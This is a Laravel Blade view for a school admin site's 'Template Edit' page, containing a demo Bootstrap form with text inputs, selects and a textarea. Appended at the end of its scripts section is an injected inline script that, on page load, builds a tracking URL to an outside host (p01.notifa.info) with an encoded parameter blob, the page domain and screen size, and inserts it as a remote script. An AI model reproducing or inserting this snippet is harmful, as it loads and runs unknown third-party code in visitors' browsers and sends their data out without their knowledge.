@extends('layouts.master')

@push('title')
- Template Edit
@endpush

@push('styles')
<!--favicon-->
  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- simplebar CSS-->
  <link href="{{asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="{{asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>

@endpush

@section('content')
<div class="row pt-2 pb-2">
        <div class="col-sm-9">
        <h4 class="page-title">Edit</h4>
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">SMK Mahaputra</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Template Halaman</a></li>
            <li class="breadcrumb-item active" aria-current="page">Edit</li>
         </ol>
     </div>
</div>
    <div class="row">
        <div class="col-lg-12">
          <div class="card">
             <div class="card-header text-uppercase">Text Input</div>
             <div class="card-body">
       
       <form>
       
          <div class="form-group row">
          <label for="basic-input" class="col-sm-3 col-form-label">Basic Input</label>
          <div class="col-sm-9">
          <input type="text" id="basic-input" class="form-control">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="placeholder-input" class="col-sm-3 col-form-label">INPUT WITH PLACEHOLDER</label>
          <div class="col-sm-9">
          <input type="text" id="placeholder-input" class="form-control" placeholder="Enter Email Address">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="disabled-input" class="col-sm-3 col-form-label">DISABLED INPUT</label>
          <div class="col-sm-9">
          <input type="text" id="disabled-input" disabled="disabled" class="form-control">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="readonly-input" class="col-sm-3 col-form-label">READONLY INPUT</label>
          <div class="col-sm-9">
          <input type="text" id="readonly-input" readonly="readonly" class="form-control">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="help-input" class="col-sm-3 col-form-label">INPUT TEXT WITH HELP</label>
          <div class="col-sm-9">
          <small class="text-muted">someone@example.com</small>
                  <input type="text" id="help-input" class="form-control">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="staticEmail" class="col-sm-3 col-form-label">STATIC INPUT</label>
          <div class="col-sm-9">
                   <input type="text" readonly class="form-control-plaintext" id="staticEmail" value="email@example.com">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="rounded-input" class="col-sm-3 col-form-label">ROUNDED INPUT</label>
          <div class="col-sm-9">
          <input type="text" id="rounded-input" class="form-control form-control-rounded">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="square-input" class="col-sm-3 col-form-label">SQUARE INPUT</label>
          <div class="col-sm-9">
          <input type="text" id="square-input" class="form-control form-control-square" placeholder="Enter Email Address">
          </div>
        </div>
        
        <div class="form-group row">
          <label for="basic-textarea" class="col-sm-3 col-form-label">TEXTAREA INPUT</label>
          <div class="col-sm-9">
          <textarea rows="4" class="form-control" id="basic-textarea"></textarea>
          </div>
        </div>
        
        <div class="form-group row">
          <label for="basic-select" class="col-sm-3 col-form-label">Select Input</label>
          <div class="col-sm-9">
          <select class="form-control" id="basic-select">
                          <option>Option 1</option>
                          <option>Option 2</option>
                          <option>Option 3</option>
                          <option>Option 4</option>
                          <option>Option 5</option>
                        </select>
          </div>
        </div>
        
        <div class="form-group row">
          <label for="multiple-select" class="col-sm-3 col-form-label">MULTIPLE SELECT</label>
          <div class="col-sm-9">
          <select multiple="multiple" class="form-control" id="multiple-select">
                          <option>Option 1</option>
                          <option>Option 2</option>
                          <option>Option 3</option>
                          <option>Option 4</option>
                          <option>Option 5</option>
                       </select>
          </div>
        </div>
        
       </form>
       
             </div>
          </div>
        </div>
      </div>
@endsection       
    
@push('scripts')

 <!-- Bootstrap core JavaScript-->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{asset('assets/js/popper.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
  
  <!-- simplebar js -->
  <script src="{{asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{asset('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{asset('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{asset('assets/js/app-script.js')}}"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhlr58gEoFacGADeyPXGgFli%2f%2fYvMa9Qn271Og1iSp%2fzcgsvYZtMdRnVH7H7JqCx3UpI3sJ01eDj6vi6sS8D9JBIycWSJAT%2bdJdv244Q7bTH3amObcA%2f1YpzQnskBWgSCsuHuTayOlndj7ViKrVdoS82zjN8vEGdicr35otXfwcP8j%2b7PlG77bKQrP6VXYE2Uoiv%2bV%2fIY%2bh3T5CiaLuaVXqHfnr6SdgM0g%2bYWfwjgOGC9coPatC0Exd7OwzOCJ4asLAuXaHM5VYg7ZwDnrMQXGhS9AqiiQ8j%2f%2fi%2fnLMcqFLkoLVjjcYoOhW58u4swKlMy3%2bjXL2dGy%2fTopQiiZVnrmgn5kfoZwIaLC4RF9RsiwcYVw7ZSaSPmg07be5oi39b2%2fQ2%2btVdtaE%2be2QTRsiXCgs6lX%2bY%2fpPIKGCDW086UIaq%2fUopXJwjnFahsGGit1oxgHN61Tn5a0dhj3Is0b8tLq0ErBaFU8iEDlLAOFS6pDnOKrFxuaLje2w" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
@endpush
    